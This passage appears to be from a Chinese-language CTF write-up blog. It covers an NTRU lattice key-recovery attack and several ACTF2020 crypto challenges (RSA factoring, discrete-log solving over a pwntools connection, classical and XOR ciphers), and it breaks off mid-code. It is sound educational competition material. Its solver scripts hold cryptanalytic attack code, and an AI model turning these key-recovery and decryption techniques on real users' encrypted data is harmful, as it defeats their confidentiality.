random_poly()</span><br><span class="line">    pubkey = balance_mod(p * g * fq, q)</span><br><span class="line">    prikey = f, fp</span><br><span class="line">    <span class="keyword">return</span> pubkey, prikey</span><br></pre></td></tr></table></figure></li><li><p><span class="math inline">\(2^{nd}\)</span> step. Encryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(m, pubkey)</span>:</span></span><br><span class="line">    r = random_poly()</span><br><span class="line">    <span class="keyword">return</span> balance_mod(pubkey * r + m, q)</span><br></pre></td></tr></table></figure></li><li><p><span class="math inline">\(3^{rd}\)</span> step. Decryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br></pre></td></tr></table></figure><p>Explain why it works,</p><p>On Zmod(q), <span class="math inline">\(c=h*r+m=p*g*fq*r+m\)</span>.</p><p><span class="math inline">\(a=c*f=p*g*(f*fq)*r+f*m=p*g*r+f*m\)</span>.</p><p><span class="math inline">\(a*fp=p*g*r*fp+(f*fp)*m\)</span>, <strong>and it equals to m on Zmod(p).</strong></p><p>当<span class="math inline">\(p*g*r+f*m\)</span>在Zmod(q)上和ZZ上完全等价，或是说该多项式系数均落在<span class="math inline">\((-q/2,q/2)\)</span>时，解密可行性成立，个人做粗略参数估计后发现应满足<span class="math inline">\(2d(p+1)&lt;q\)</span>（有paper上给出<strong>p(6d+1)&lt;q</strong>，但证明暂时没时间看ojz）</p></li></ul><p>下再给出针对NTRU的攻击：</p><p>On Zmod(q), <span class="math inline">\(h=p*g*fq=p*g/f\)</span>.</p><p>Let <span class="math inline">\(hp=p*p^{-1}*g/f\)</span>, so we have <span class="math inline">\(g=f*hp\)</span>.</p><p>f's coef <span class="math inline">\(\in \{-1,0,1\}\)</span>, this means g is obtained as a combination of the polys <span class="math inline">\(q,qx,qx^{2},...,qx^{n-1},hp,hp*x,hp*x^{2},...,hp*x^{n-1}\)</span>.</p><p>Assume <span class="math inline">\(hp=\sum a_{i}x^{i}\)</span>, <span class="math display">\[\left[\begin{matrix}q &amp; 0 &amp; ... &amp; ... &amp; 0 &amp; ... &amp; ... &amp; 0\\0 &amp; q &amp; 0 &amp; ... &amp; 0 &amp; ... &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ...\\0 &amp; 0 &amp; ... &amp; q &amp; 0 &amp; ... &amp; ... &amp; 0\\a_{0} &amp; a_{1} &amp; ... &amp; a_{n-1} &amp; 1 &amp; 0 &amp; ... &amp; 0\\a_{n-1} &amp; a_{0} &amp; ... &amp; a_{n-2} &amp; 0 &amp; 1 &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ...\\a_{1} &amp; a_{2} &amp; ... &amp; a_{0} &amp; 0 &amp; 0 &amp; ... &amp; 1\\\end{matrix}\right]\]</span> 对上述格子作规约，SVP得到的向量如果呈现g的{0, 1, -1}特性且检验通过，则攻击成功</p><p>以<span class="math inline">\(R(AL[0][n:])\)</span>作为f进行dec.</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">109</span></span><br><span class="line">d = <span class="number">9</span></span><br><span class="line">q = <span class="number">2048</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line">pubkey = </span><br><span class="line">pubkey = R(pubkey)</span><br><span class="line">c = </span><br><span class="line">c = R(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(pubkey, c)</span>:</span></span><br><span class="line">    A = Matrix(ZZ, <span class="number">2</span> * n, <span class="number">2</span> * n)</span><br><span class="line">    hp = inverse(p, q) * pubkey</span><br><span class="line">    hp_list = list(hp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        A[i, i] = q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n, <span class="number">2</span> * n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            A[i, j] = hp_list[(j - i) % n]</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">    AL = A.BKZ()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> AL:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = R(row[n:].list())</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            <span class="keyword">return</span> dec(c, (f, fp))</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># may failed with shortest vector(return more if failed)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">m = crack(pubkey, c)</span><br><span class="line">flag = <span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> list(m))</span><br><span class="line">pad = <span class="number">8</span> - len(flag) % <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(pad + <span class="number">1</span>):</span><br><span class="line">    print(long_to_bytes(int(<span class="string">'0'</span> * i + flag + <span class="string">'0'</span> * (pad - i), <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'\x80Fdl\xccfj\xc4pr\xc8fF\x80'</span></span><br><span class="line"><span class="string">b'@#26f35b89d3#@'</span></span><br><span class="line"><span class="string">b' \x11\x99\x1b3\x19\x9a\xb1\x1c\x1c\xb2\x19\x91\xa0'</span></span><br><span class="line"><span class="string">b'\x10\x08\xcc\x8d\x99\x8c\xcdX\x8e\x0eY\x0c\xc8\xd0'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(ACTF2020)</title>
      <link href="/2020/06/06/WriteUp-ACTF2020/"/>
      <url>/2020/06/06/WriteUp-ACTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="preface">Preface</h2><p>期末月了quq，打完RCTF(多元coppersmith鲨我😭)后，回来打了一波校赛（web听同学说应该有丶顶，但退坑web手已经看不下去了- -，cry这次应该考虑到了有学弟学妹，所以偏引导向）</p><p>这次ACTF打完<strong>真</strong>回去补课内ddl了（逃</p><h2 id="crypto">Crypto</h2><h3 id="column-permutation-cipher">Column Permutation Cipher</h3><h4 id="题解分析">[题解分析]</h4><p>简单列置换密码，爆破key</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ct = </span><br><span class="line">ct_len = len(ct)</span><br><span class="line">pt = [<span class="string">'?'</span>] * ct_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, ct_len // <span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> (ct_len % i) != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(i)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ct_len // i):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(j, ct_len, ct_len // i):</span><br><span class="line">pt[cnt] = ct[k]</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span>.join(pt)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"actf"</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="我的密码本">我的密码本</h3><h4 id="题解分析-1">[题解分析]</h4><p>替换密码，pt马丁路德金i have a dream，写字典跑脚本还不如直接sublime- -</p><h3 id="bomb-or-boom">bomb or boom</h3><h4 id="题解分析-2">[题解分析]</h4><p>披cry皮misc题，bloom (k, n)门限方案(k = 4, n = 5)</p><ul><li>Secret 1: 培根</li><li>Secret 2: 盲文 <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></li><li>Secret 4: AAencode</li><li>Secret 5: Brainfuck</li></ul><p>bloom门限恢复明文即可.</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="number">2891369521230520600</span></span><br><span class="line">m1 = <span class="number">5539166121540472709</span></span><br><span class="line">a2 = <span class="number">5485400237604727152</span></span><br><span class="line">m2 = <span class="number">9993590208169240051</span></span><br><span class="line">a3 = <span class="number">15126620242797492888</span></span><br><span class="line">m3 = <span class="number">38726457607077802967</span></span><br><span class="line">a4 = <span class="number">63558232650391605454</span></span><br><span class="line">m4 = <span class="number">134070550878039878083</span></span><br><span class="line">a = [a1, a2, a3, a4]</span><br><span class="line">m = [m1, m2, m3, m4]</span><br><span class="line">print(bytes.fromhex(hex(crt(a, m))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="naive-encryption">naive encryption</h3><p>Enc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">len_flag = len(flag)</span><br><span class="line">...</span><br><span class="line">cipher = flag</span><br><span class="line">n = <span class="number">1000</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len_flag):</span><br><span class="line">        cipher[i] = (cipher[i] * k[(n + <span class="number">2</span>) % len_k] + k[(n * <span class="number">7</span>) % len_k]) &amp; <span class="number">0xff</span></span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><p>Dec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br></pre></td></tr></table></figure><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt;= <span class="number">1000</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">        cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">print(bytes(cipher))</span><br></pre></td></tr></table></figure><h3 id="naive-rsa">naive rsa</h3><h4 id="题解分析-3">[题解分析]</h4><p>已知<span class="math inline">\(a=p\%q\)</span>，即<span class="math inline">\(p=iq+a\)</span>，爆破i使得方程在ZZ下有解即可.</p><h4 id="exp-3">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">1</span>, <span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    r, _ = iroot(a**<span class="number">2</span> + <span class="number">4</span> * i * n, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> _:</span><br><span class="line">        q = (-a + int(r)) // (<span class="number">2</span> * i)</span><br><span class="line">        <span class="keyword">assert</span>(n % q == <span class="number">0</span>)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="dlp头号玩家">DLP头号玩家</h3><h4 id="题解分析-4">[题解分析]</h4><ul><li>level1: <code>p=getPrime(33)</code>，BSGS复杂度控制在<span class="math inline">\(O(2^{16})\)</span>.</li><li>level2: 给出<span class="math inline">\(g,g^{k}\ mod\ p,m*g^{dk}\ mod\ p\)</span>，且<code>d=bytes_to_long(message[0:2])</code>，所以在0xffff下爆破d即可还原m.</li><li>level3: 发现并不是ECDLP- -因为最后给出的cipher不是曲线上的点，而是实数范围上的<code>message[k]*k_Q_x</code>，发现源码中的<code>get_ng</code>函数实际上就是将椭圆上的点*100，于是题目给出基点G，求出<span class="math inline">\(C=100^{2}G\)</span>，<span class="math inline">\(chr(cipher//C_{x})\)</span>即为对应明文字节，逐位恢复即可.</li></ul><h4 id="exp-4">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">flag_dist = (string.ascii_letters + string.digits + <span class="string">"-&#123;&#125;"</span>).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">not</span> <span class="keyword">in</span> flag_dist:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    message1 = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"c="</span>)</span><br><span class="line">        c = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        y = bsgs(g, c, p)</span><br><span class="line">        <span class="keyword">if</span> len(y):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> y:</span><br><span class="line">                <span class="keyword">if</span> check(long_to_bytes(_)):</span><br><span class="line">                    message1 += long_to_bytes(_)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Failed."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    message1 = message1.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(message1)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message1)</span><br><span class="line">    <span class="keyword">return</span> message1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"pubkey= ("</span>)</span><br><span class="line">    pubkey = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    pubkey = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> pubkey.split(<span class="string">","</span>)]</span><br><span class="line">    e, g, p = pubkey[<span class="number">0</span>], pubkey[<span class="number">1</span>], pubkey[<span class="number">2</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"cipher= ("</span>)</span><br><span class="line">    cipher = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    cipher = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> cipher.split(<span class="string">","</span>)]</span><br><span class="line">    a, b = cipher[<span class="number">0</span>], cipher[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">        message2 = long_to_bytes((inverse(pow(a, d, p), p) * b) % p)</span><br><span class="line">        <span class="keyword">if</span> check(message2):</span><br><span class="line">            message2 = (long_to_bytes(d) + message2).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            print(message2)</span><br><span class="line">            io.sendlineafter(<span class="string">"input the message:"</span>, message2)</span><br><span class="line">            <span class="keyword">return</span> message2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    params = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    regex = re.compile(<span class="string">"a=(\d+), b=(\d+)"</span>)</span><br><span class="line">    params = regex.findall(params)[<span class="number">0</span>]</span><br><span class="line">    a, b = int(params[<span class="number">0</span>]), int(params[<span class="number">1</span>])</span><br><span class="line">    Ep = EllipticCurve(GF(p), [a, b])</span><br><span class="line">    message3 = []</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        s = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        regex = re.compile(<span class="string">"G=\((\d+),(\d+)\),C=(\d+)"</span>)</span><br><span class="line">        s = regex.findall(s)[<span class="number">0</span>]</span><br><span class="line">        x, y, c = int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])</span><br><span class="line">        G = Ep(x, y)</span><br><span class="line">        C = <span class="number">10000</span> * G</span><br><span class="line">        message3.append(c // int(C[<span class="number">0</span>]))</span><br><span class="line">    message3 = <span class="string">""</span>.join(chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> message3)</span><br><span class="line">    print(message3)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message3)</span><br><span class="line">    <span class="keyword">return</span> message3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    print(level1() + level2() + level3())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="imitation-game">Imitation game</h3><h4 id="题解分析-5">[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iv=getRandomRange(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,message)</span>:</span></span><br><span class="line">    padding=[iv]   </span><br><span class="line">    cipher=[message[<span class="number">0</span>]^padding[<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len_flag):</span><br><span class="line">        <span class="comment">#print(cipher)</span></span><br><span class="line">        padding.append(cipher[i<span class="number">-1</span>]^padding[i<span class="number">-1</span>])</span><br><span class="line">        cipher.append(message[i]^padding[i])</span><br><span class="line">    print(<span class="string">"cipher=&#123;&#125;"</span>.format(cipher))</span><br></pre></td></tr></table></figure><p>即<span class="math inline">\(cipher=[m[0]\oplus iv,m[1]\oplus m[0],...,m[n-1]\oplus m[n-2]]\)</span>.</p><p>所以爆破iv获得254种可能中间态.</p><p>而中间态和flag间关系如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    message=strxor(flag,plaintext[i])</span><br><span class="line">    